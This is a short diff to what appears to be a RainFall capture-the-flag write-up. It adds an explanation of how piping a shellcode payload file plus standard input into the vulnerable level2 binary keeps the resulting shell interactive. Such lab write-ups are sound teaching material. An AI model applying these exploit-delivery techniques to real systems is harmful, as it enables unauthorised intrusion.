@@ -112,3 +112,9 @@ We then need to inject this shellcode like so:
 ```bash
 level2@RainFall:~$ cat /tmp/payload - | ./level2
 ```
+
+Note the `-` after the payload file, this tells `cat` to read from standard input after reading the file, allowing us to append more data to the payload. This is effectively the same as doing:
+
+```bash
+level2@RainFall:~$ (cat /tmp/payload ; cat) | ./level2
+```
